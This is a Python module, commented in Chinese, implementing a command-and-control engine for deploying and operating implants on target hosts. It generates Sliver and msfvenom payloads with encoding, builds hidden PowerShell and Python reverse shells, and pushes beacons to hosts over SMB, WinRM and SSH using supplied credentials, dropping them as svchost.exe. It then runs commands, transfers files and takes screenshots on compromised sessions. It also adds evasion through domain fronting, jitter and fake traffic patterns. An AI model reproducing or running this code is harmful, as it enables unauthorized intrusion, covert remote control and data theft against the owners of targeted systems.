"""
C2集成引擎 v1.0 — C2 Integration Engine
───────────────────────────────────────────
覆盖:
  • Cobalt Strike: headless客户端/beacon管理/命令下发
  • Sliver: 原生集成/operator/session管理
  • 自定义C2协议: HTTP/HTTPS/DNS/WebSocket
  • Beacon生命周期: 生成→投递→上线→命令→收集→清理
  • 文件管理: 上传/下载/截图/键盘记录
  • 横向扩展: beacon联动内网模块
  • 隐蔽通信: 流量伪装/Jitter/域前置

工具依赖: cobaltstrike-client(可选), sliver-client, msfvenom

用法:
  from .c2_integration import C2Manager

  c2 = C2Manager(project_id=5)

  # 生成beacon
  beacon = c2.generate_beacon(lhost="10.0.0.1", lport=443, arch="x64", os="windows")

  # Sliver集成
  sessions = c2.sliver_list_sessions()

  # 命令下发
  c2.sliver_execute(session_id="abc123", command="whoami")

  # 一键部署+上线
  result = c2.deploy_beacon("10.0.1.5", credential=("admin","pass"), lhost="10.0.0.1")
"""

import subprocess, json, time, os, re, base64, random, string
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Callable, Tuple
from enum import Enum

from . import db

TMP = Path("/tmp/c2")
TMP.mkdir(exist_ok=True)
PAYLOADS = Path("/opt/deepseek-bot/payloads")
PAYLOADS.mkdir(exist_ok=True)

# ==================== 枚举 ====================

class C2Protocol(Enum):
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    SMB = "smb"
    TCP = "tcp"
    WEBSOCKET = "websocket"
    MTLS = "mtls"
    WIREGUARD = "wireguard"

class BeaconType(Enum):
    CS_HTTP = "cs_http"            # Cobalt Strike HTTP Beacon
    CS_HTTPS = "cs_https"          # Cobalt Strike HTTPS Beacon
    CS_SMB = "cs_smb"              # Cobalt Strike SMB Beacon
    CS_DNS = "cs_dns"              # Cobalt Strike DNS Beacon
    SLIVER_HTTP = "sliver_http"    # Sliver HTTP(S) implant
    SLIVER_MTLS = "sliver_mtls"    # Sliver mTLS implant
    SLIVER_WG = "sliver_wg"        # Sliver WireGuard implant
    MSFVENOM_REVERSE = "msf_reverse"     # MSF reverse_tcp
    MSFVENOM_BIND = "msf_bind"          # MSF bind_tcp
    CUSTOM_POWERSHELL = "ps_custom"      # 自定义PS
    CUSTOM_PYTHON = "py_custom"          # 自定义Python

class BeaconState(Enum):
    GENERATED = "generated"
    DEPLOYED = "deployed"
    ONLINE = "online"
    DEAD = "dead"
    REMOVED = "removed"

# ==================== 数据模型 ====================

@dataclass
class BeaconConfig:
    """Beacon配置"""
    beacon_type: BeaconType
    lhost: str
    lport: int
    protocol: C2Protocol = C2Protocol.HTTPS
    arch: str = "x64"                    # x64/x86
    os: str = "windows"                  # windows/linux/macos
    sleep_time: int = 60                 # 心跳间隔(秒)
    jitter: int = 20                     # 抖动百分比
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    encryption_key: str = ""             # 加密密钥
    domain_front: str = ""               # 域前置域名
    custom_headers: Dict[str, str] = field(default_factory=dict)
    kill_date: str = ""                  # 自毁日期 "2026-12-31"
    output_path: str = ""

@dataclass
class BeaconSession:
    """已上线的Beacon"""
    session_id: str
    beacon_type: BeaconType
    hostname: str
    username: str
    os: str
    internal_ip: str
    external_ip: str
    pid: int
    arch: str
    privileges: str                     # user/admin/SYSTEM
    first_seen: float
    last_seen: float
    state: BeaconState = BeaconState.ONLINE
    pending_commands: List[str] = field(default_factory=list)
    collected_data: Dict[str, Any] = field(default_factory=dict)

@dataclass
class BeaconCommand:
    """Beacon命令"""
    command: str
    args: str = ""
    timeout: int = 60
    output: str = ""
    status: str = "pending"             # pending/running/done/error
    elapsed: float = 0.0


# ==================== Beacon生成器 ====================

class BeaconGenerator:
    """生成各种类型的Beacon"""

    # Sliver生成模板
    SLIVER_TEMPLATES = {
        BeaconType.SLIVER_HTTP: "sliver generate --http {lhost}:{lport} --os {os} --arch {arch} --format exe --save {output}",
        BeaconType.SLIVER_MTLS: "sliver generate --mtls {lhost}:{lport} --os {os} --arch {arch} --format exe --save {output}",
        BeaconType.SLIVER_WG: "sliver generate --wg {lhost}:{lport} --os {os} --arch {arch} --format exe --save {output}",
    }

    # MSFVenom模板
    MSFVENOM_TEMPLATES = {
        BeaconType.MSFVENOM_REVERSE: "msfvenom -p {os}/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}",
        BeaconType.MSFVENOM_BIND: "msfvenom -p {os}/x64/meterpreter/bind_tcp LPORT={lport} -f exe -o {output}",
    }

    @staticmethod
    def generate(config: BeaconConfig) -> Tuple[bool, str]:
        """
        生成Beacon payload
        
        Returns:
            (成功, 输出文件路径)
        """
        PAYLOADS.mkdir(exist_ok=True)
        output_path = config.output_path or str(PAYLOADS / f"beacon_{int(time.time())}")

        if config.beacon_type.value.startswith("sliver"):
            return BeaconGenerator._gen_sliver(config, output_path)
        elif config.beacon_type.value.startswith("msf"):
            return BeaconGenerator._gen_msfvenom(config, output_path)
        elif config.beacon_type.value.startswith("ps_"):
            return BeaconGenerator._gen_powershell(config, output_path)
        elif config.beacon_type.value.startswith("py_"):
            return BeaconGenerator._gen_python(config, output_path)
        elif config.beacon_type.value.startswith("cs_"):
            return BeaconGenerator._gen_cs(config, output_path)
        else:
            return (False, f"不支持的Beacon类型: {config.beacon_type}")

    @staticmethod
    def _gen_sliver(config: BeaconConfig, output: str) -> Tuple[bool, str]:
        """生成Sliver implant"""
        template = BeaconGenerator.SLIVER_TEMPLATES.get(config.beacon_type)
        if not template:
            return (False, "不支持的Sliver类型")

        cmd = template.format(
            lhost=config.lhost, lport=config.lport,
            os=config.os, arch=config.arch, output=output
        )

        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
            if result.returncode == 0 or Path(output).exists():
                # 也生成shellcode版本
                shellcode_cmd = f"sliver generate --http {config.lhost}:{config.lport} --os {config.os} --arch {config.arch} --format shellcode --save {output}.bin 2>&1"
                subprocess.run(shellcode_cmd, shell=True, capture_output=True, text=True, timeout=60)
                return (True, output)
            return (False, result.stderr[:500])
        except FileNotFoundError:
            return (False, "sliver-client未安装")
        except Exception as e:
            return (False, str(e))

    @staticmethod
    def _gen_msfvenom(config: BeaconConfig, output: str) -> Tuple[bool, str]:
        """生成MSFVenom payload"""
        template = BeaconGenerator.MSFVENOM_TEMPLATES.get(config.beacon_type)
        if not template:
            return (False, "不支持的MSFVenom类型")

        os_map = {"windows": "windows", "linux": "linux", "macos": "osx"}
        cmd = template.format(
            lhost=config.lhost, lport=config.lport,
            os=os_map.get(config.os, "windows"), output=output
        )

        # 添加编码/混淆
        if config.os == "windows":
            cmd += " -e x64/shikata_ga_nai -i 5"

        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
            if Path(output).exists():
                return (True, output)
            return (False, result.stderr[:500])
        except FileNotFoundError:
            return (False, "msfvenom未安装")
        except Exception as e:
            return (False, str(e))

    @staticmethod
    def _gen_powershell(config: BeaconConfig, output: str) -> Tuple[bool, str]:
        """生成PowerShell payload"""
        # Base64编码的反向shell
        ps_code = f"""
$client = New-Object System.Net.Sockets.TCPClient('{config.lhost}',{config.lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
"""
        ps_b64 = base64.b64encode(ps_code.encode('utf-16le')).decode()
        payload = f"powershell -NoP -NonI -W Hidden -Enc {ps_b64}"
        Path(output).write_text(payload)
        Path(output + ".b64").write_text(ps_b64)
        return (True, output)

    @staticmethod
    def _gen_python(config: BeaconConfig, output: str) -> Tuple[bool, str]:
        """生成Python反向shell"""
        py_code = f'''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{config.lhost}",{config.lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh" if "{config.os}"!="windows" else "cmd.exe","-i"])
'''
        Path(output).write_text(py_code)
        return (True, output)

    @staticmethod
    def _gen_cs(config: BeaconConfig, output: str) -> Tuple[bool, str]:
        """Cobalt Strike beacon生成 (需要CS headless客户端)"""
        # CS需要GUI或agscript，这里生成配置供手动使用
        cs_config = f"""
# Cobalt Strike Beacon Config
beacon_type: {config.beacon_type.value}
lhost: {config.lhost}
lport: {config.lport}
protocol: {config.protocol.value}
sleep: {config.sleep_time}
jitter: {config.jitter}
user_agent: {config.user_agent}
"""
        Path(output + ".cs.conf").write_text(cs_config)
        return (True, output + ".cs.conf")


# ==================== Sliver管理 ====================

class SliverManager:
    """Sliver C2管理 — 命令行交互"""

    @staticmethod
    def _sliver_cmd(cmd: str, timeout: int = 30) -> str:
        """执行sliver命令"""
        full_cmd = f"sliver {cmd} 2>&1"
        try:
            return subprocess.run(full_cmd, shell=True, capture_output=True, text=True, timeout=timeout).stdout
        except Exception as e:
            return f"[错误: {e}]"

    @staticmethod
    def list_sessions() -> List[BeaconSession]:
        """列出所有活跃session"""
        out = SliverManager._sliver_cmd("sessions")
        sessions = []

        for line in out.split("\n"):
            if "│" in line and "ID" not in line:
                parts = [p.strip() for p in line.split("│") if p.strip()]
                if len(parts) >= 6:
                    try:
                        sessions.append(BeaconSession(
                            session_id=parts[0],
                            beacon_type=BeaconType.SLIVER_HTTP,
                            hostname=parts[2] if len(parts) > 2 else "unknown",
                            username=parts[3] if len(parts) > 3 else "unknown",
                            os=parts[1] if len(parts) > 1 else "unknown",
                            internal_ip=parts[4] if len(parts) > 4 else "",
                            external_ip="",
                            pid=0, arch="x64", privileges="",
                            first_seen=time.time(), last_seen=time.time()
                        ))
                    except Exception:
                        pass

        return sessions

    @staticmethod
    def execute(session_id: str, command: str, timeout: int = 30) -> BeaconCommand:
        """在session上执行命令"""
        start = time.time()
        out = SliverManager._sliver_cmd(f"use -i {session_id} execute -o '{command}'", timeout)
        return BeaconCommand(
            command=command,
            output=out[:2000],
            status="done" if out and "[error]" not in out.lower() else "error",
            elapsed=time.time() - start
        )

    @staticmethod
    def upload(session_id: str, local_file: str, remote_path: str) -> BeaconCommand:
        """上传文件"""
        cmd = f"use -i {session_id} upload {local_file} {remote_path}"
        out = SliverManager._sliver_cmd(cmd, timeout=60)
        return BeaconCommand(
            command="upload",
            args=f"{local_file} → {remote_path}",
            output=out[:500],
            status="done" if "uploaded" in out.lower() or "success" in out.lower() else "error"
        )

    @staticmethod
    def download(session_id: str, remote_path: str, local_path: str = "") -> BeaconCommand:
        """下载文件"""
        local = local_path or str(TMP / f"download_{int(time.time())}")
        cmd = f"use -i {session_id} download {remote_path} {local}"
        out = SliverManager._sliver_cmd(cmd, timeout=120)
        return BeaconCommand(
            command="download",
            args=f"{remote_path} → {local}",
            output=out[:500],
            status="done" if "downloaded" in out.lower() else "error"
        )

    @staticmethod
    def screenshot(session_id: str) -> BeaconCommand:
        """截图"""
        output_file = str(TMP / f"screenshot_{session_id}_{int(time.time())}.png")
        cmd = f"use -i {session_id} screenshot -s {output_file}"
        out = SliverManager._sliver_cmd(cmd, timeout=30)
        return BeaconCommand(
            command="screenshot",
            output=out[:500],
            status="done" if Path(output_file).exists() else "error"
        )

    @staticmethod
    def start_http_listener(lhost: str, lport: int) -> Tuple[bool, str]:
        """启动HTTP监听器"""
        cmd = f"http --lhost {lhost} --lport {lport} --persistent"
        out = SliverManager._sliver_cmd(f"start listener {cmd}", timeout=10)
        return ("started" in out.lower() or "error" not in out.lower(), out[:500])

    @staticmethod
    def stage_implant(session_id: str, target_url: str,
                      payload_type: str = "http") -> bool:
        """在已有session上植入beacon到横向目标"""
        # 通过已有session投递beacon
        cmd = f"use -i {session_id} stage --url {target_url} --method {payload_type}"
        out = SliverManager._sliver_cmd(cmd, timeout=60)
        return "staged" in out.lower() or "success" in out.lower()


# ==================== Beacon部署器 ====================

class BeaconDeployer:
    """将Beacon投递到目标主机"""

    @staticmethod
    def deploy_via_smb(target: str, beacon_path: str, credential: Tuple[str, str],
                       domain: str = "") -> Tuple[bool, str]:
        """
        通过SMB部署Beacon
        
        Args:
            target: 目标IP
            beacon_path: beacon文件路径
            credential: (user, password)
            domain: 域名
        """
        user, pwd = credential
        domain_part = f"{domain}/" if domain else ""

        # 1. 启动SMB共享
        share_cmd = f"impacket-smbserver -smb2support SHARE /tmp/c2 2>&1 &"
        subprocess.Popen(share_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # 2. 复制beacon
        copy_cmd = (
            f"impacket-wmiexec {domain_part}{user}:'{pwd}'@{target} "
            f"'cmd /c copy \\\\<ATTACKER_IP>\\SHARE\\{os.path.basename(beacon_path)} C:\\Windows\\Temp\\svchost.exe' 2>&1"
        )
        try:
            out = subprocess.run(copy_cmd, shell=True, capture_output=True, text=True, timeout=30)
            success = "error" not in out.stdout.lower()
            return (success, out.stdout[:500])
        except Exception as e:
            return (False, str(e))

    @staticmethod
    def deploy_via_winrm(target: str, beacon_path: str, credential: Tuple[str, str],
                         domain: str = "") -> Tuple[bool, str]:
        """通过WinRM部署Beacon"""
        user, pwd = credential
        domain_part = f"{domain}\\" if domain else ""
        beacon_name = os.path.basename(beacon_path)

        # 通过evil-winrm上传+执行
        upload_script = f"""
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('{beacon_path}'))
[IO.File]::WriteAllBytes('C:\\Windows\\Temp\\{beacon_name}', [Convert]::FromBase64String($b64))
Start-Process -NoNewWindow -FilePath 'C:\\Windows\\Temp\\{beacon_name}'
"""

        cmd = f"evil-winrm -i {target} -u '{domain_part}{user}' -p '{pwd}' -s '{upload_script}' 2>&1"
        try:
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            success = "error" not in out.stdout.lower()
            return (success, out.stdout[:500])
        except Exception as e:
            return (False, str(e))

    @staticmethod
    def deploy_via_ssh(target: str, beacon_path: str, credential: Tuple[str, str]) -> Tuple[bool, str]:
        """通过SSH部署Beacon"""
        user, pwd = credential

        # SCP上传
        scp_cmd = f"sshpass -p '{pwd}' scp -o StrictHostKeyChecking=no {beacon_path} {user}@{target}:/tmp/beacon 2>&1"
        try:
            out1 = subprocess.run(scp_cmd, shell=True, capture_output=True, text=True, timeout=30)

            # SSH执行
            exec_cmd = f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no {user}@{target} 'chmod +x /tmp/beacon && nohup /tmp/beacon &' 2>&1"
            out2 = subprocess.run(exec_cmd, shell=True, capture_output=True, text=True, timeout=30)

            return (True, f"上传: {out1.stdout[:200]}\n执行: {out2.stdout[:200]}")
        except Exception as e:
            return (False, str(e))


# ==================== 隐蔽通信 ====================

class StealthComms:
    """隐蔽通信 — 流量伪装/域前置/Jitter"""

    @staticmethod
    def generate_domain_front_headers(front_domain: str) -> Dict[str, str]:
        """
        生成域前置HTTP头
        
        使用高信誉域名作为Host头，真实C2地址在TLS SNI中
        """
        return {
            "Host": front_domain,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Cache-Control": "no-cache",
            "X-Forwarded-For": f"{random.randint(10,200)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        }

    @staticmethod
    def calculate_jitter(sleep_time: int, jitter_pct: int) -> int:
        """计算抖动后的sleep时间"""
        variation = int(sleep_time * jitter_pct / 100)
        return sleep_time + random.randint(-variation, variation)

    @staticmethod
    def generate_traffic_pattern(beacon_count: int = 3,
                                 duration_hours: int = 8) -> List[Dict]:
        """
        生成虚假流量模式 — 模拟正常用户行为
        
        Returns:
            [(时间偏移(秒), 动作类型, 参数)]
        """
        patterns = []
        actions = ["browse", "api_call", "static", "idle", "login", "download"]

        total_seconds = duration_hours * 3600

        for i in range(beacon_count):
            for _ in range(random.randint(5, 20)):
                offset = random.randint(0, total_seconds)
                action = random.choice(actions)
                patterns.append({
                    "beacon_id": i,
                    "offset_seconds": offset,
                    "action": action,
                    "jitter": random.randint(1, 30),
                    "payload_size": random.randint(100, 10000) if action == "download" else random.randint(50, 500)
                })

        return sorted(patterns, key=lambda x: x["offset_seconds"])


# ==================== 总控引擎 ====================

class C2Manager:
    """
    C2总控引擎
    
    用例:
      c2 = C2Manager(project_id=5)
      
      # 生成beacon
      beacon = c2.generate_beacon(
          lhost="10.0.0.1", lport=443,
          beacon_type=BeaconType.SLIVER_HTTP,
          os="windows", arch="x64"
      )
      
      # Sliver管理
      sessions = c2.sliver_list_sessions()
      c2.sliver_execute("abc123", "net user")
      c2.sliver_upload("abc123", "beacon.exe", "C:\\Windows\\Temp\\svchost.exe")
      c2.sliver_screenshot("abc123")
      
      # 部署beacon到目标
      c2.deploy_beacon("10.0.1.5", credential=("admin","pass"), lhost="10.0.0.1", lport=443)
      
      # 一键上线
      result = c2.quick_deploy("10.0.1.5", ("admin","pass"), "10.0.0.1", 443)
    """

    def __init__(self, project_id: int, uid: int = 0,
                 callback: Optional[Callable] = None):
        self.project_id = project_id
        self.uid = uid
        self.cb = callback or (lambda *a: None)
        self.generator = BeaconGenerator()
        self.sliver = SliverManager()
        self.deployer = BeaconDeployer()
        self.stealth = StealthComms()
        self._active_sessions: Dict[str, BeaconSession] = {}

    def _step(self, tool: str, target: str, status: str, msg: str = ""):
        self.cb(tool, target, status, msg)
        if status == "running":
            db.scan_start(self.project_id, self.uid, tool, target)

    # === Beacon生成 ===

    def generate_beacon(self, lhost: str, lport: int,
                        beacon_type: BeaconType = BeaconType.SLIVER_HTTP,
                        os: str = "windows", arch: str = "x64",
                        sleep_time: int = 60, jitter: int = 20,
                        domain_front: str = "") -> Tuple[bool, str]:
        """生成Beacon payload"""
        self._step("c2-generate", lhost, "running", f"类型: {beacon_type.value}")

        config = BeaconConfig(
            beacon_type=beacon_type,
            lhost=lhost, lport=lport,
            os=os, arch=arch,
            sleep_time=sleep_time, jitter=jitter,
            domain_front=domain_front,
            protocol=C2Protocol.HTTPS if lport == 443 else C2Protocol.HTTP
        )

        success, path = self.generator.generate(config)

        self._step("c2-generate", lhost, "done",
                   f"{'✅' if success else '❌'} {path}")
        return (success, path)

    # === Sliver管理 ===

    def sliver_list_sessions(self) -> List[BeaconSession]:
        """列出所有Sliver session"""
        self._step("c2-sliver", "sessions", "running", "列出session")
        sessions = self.sliver.list_sessions()
        for s in sessions:
            self._active_sessions[s.session_id] = s
        self._step("c2-sliver", "sessions", "done", f"{len(sessions)} 个活跃session")
        return sessions

    def sliver_execute(self, session_id: str, command: str,
                       timeout: int = 30) -> BeaconCommand:
        """在session上执行命令"""
        self._step("c2-exec", session_id, "running", f"命令: {command[:50]}")
        result = self.sliver.execute(session_id, command, timeout)
        self._step("c2-exec", session_id, "done",
                   f"{'✅' if result.status == 'done' else '❌'}")
        return result

    def sliver_upload(self, session_id: str, local_file: str,
                      remote_path: str) -> BeaconCommand:
        """上传文件到session"""
        self._step("c2-upload", session_id, "running", f"{local_file} → {remote_path}")
        result = self.sliver.upload(session_id, local_file, remote_path)
        self._step("c2-upload", session_id, "done",
                   f"{'✅' if result.status == 'done' else '❌'}")
        return result

    def sliver_download(self, session_id: str, remote_path: str,
                        local_path: str = "") -> BeaconCommand:
        """从session下载文件"""
        self._step("c2-download", session_id, "running", remote_path)
        result = self.sliver.download(session_id, remote_path, local_path)
        self._step("c2-download", session_id, "done",
                   f"{'✅' if result.status == 'done' else '❌'}")
        return result

    def sliver_screenshot(self, session_id: str) -> BeaconCommand:
        """截图"""
        self._step("c2-screenshot", session_id, "running", "截图")
        result = self.sliver.screenshot(session_id)
        self._step("c2-screenshot", session_id, "done",
                   f"{'✅' if result.status == 'done' else '❌'}")
        return result

    # === Beacon部署 ===

    def deploy_beacon(self, target: str, credential: Tuple[str, str],
                      lhost: str = "", lport: int = 443,
                      beacon_path: str = "", domain: str = "",
                      method: str = "auto") -> Dict[str, Any]:
        """
        部署beacon到目标主机
        
        Args:
            target: 目标IP
            credential: (user, password)
            lhost/lport: C2地址（用于生成新beacon）
            beacon_path: 已有beacon路径（跳过生成）
            domain: Windows域
            method: smb/winrm/ssh/auto
        """
        report = {"target": target, "success": False, "method": "", "beacon_path": ""}

        # 生成beacon（如果没有提供）
        if not beacon_path and lhost:
            self._step("c2-deploy", target, "running", "生成beacon...")
            ok, beacon_path = self.generate_beacon(lhost, lport, os="windows")
            if not ok:
                report["error"] = f"Beacon生成失败: {beacon_path}"
                return report

        report["beacon_path"] = beacon_path

        # 选择部署方法
        if method == "auto":
            methods = ["winrm", "smb", "ssh"]
        else:
            methods = [method]

        for m in methods:
            self._step("c2-deploy", target, "running", f"方法: {m}")

            if m == "smb":
                ok, out = self.deployer.deploy_via_smb(target, beacon_path, credential, domain)
            elif m == "winrm":
                ok, out = self.deployer.deploy_via_winrm(target, beacon_path, credential, domain)
            elif m == "ssh":
                ok, out = self.deployer.deploy_via_ssh(target, beacon_path, credential)
            else:
                continue

            if ok:
                report["success"] = True
                report["method"] = m
                report["output"] = out[:500]
                self._step("c2-deploy", target, "done", f"✅ {m}")
                break
            else:
                self._step("c2-deploy", target, "running", f"❌ {m}: {out[:100]}")

        if not report["success"]:
            self._step("c2-deploy", target, "done", "❌ 所有方法失败")
            report["error"] = "所有部署方法失败"

        return report

    # === 一键快捷部署 ===

    def quick_deploy(self, target: str, credential: Tuple[str, str],
                     lhost: str, lport: int = 443, domain: str = "") -> Dict[str, Any]:
        """
        一键部署+上线
        
        流程: 生成beacon → 部署 → 等待上线 → 验证
        """
        self._step("c2-quick", target, "running", "一键部署...")

        result = self.deploy_beacon(target, credential, lhost, lport, domain=domain)

        if result["success"]:
            # 等待beacon上线
            self._step("c2-quick", target, "running", "等待beacon上线...")
            time.sleep(5)
            sessions = self.sliver_list_sessions()
            result["sessions"] = [
                {"id": s.session_id, "hostname": s.hostname, "user": s.username}
                for s in sessions
            ]
            result["beacon_online"] = len(sessions) > 0

        self._step("c2-quick", target, "done",
                   f"{'✅ 上线' if result.get('beacon_online') else '⚠️ 部署成功，等待上线'}")

        return result

    # === 隐蔽通信配置 ===

    def enable_stealth(self, domain_front: str = "www.microsoft.com",
                       sleep_time: int = 120, jitter: int = 50) -> Dict[str, Any]:
        """启用隐蔽通信模式"""
        headers = self.stealth.generate_domain_front_headers(domain_front)
        traffic = self.stealth.generate_traffic_pattern()

        return {
            "domain_front": domain_front,
            "headers": headers,
            "sleep_time": sleep_time,
            "jitter": jitter,
            "traffic_pattern": traffic[:10],
        }
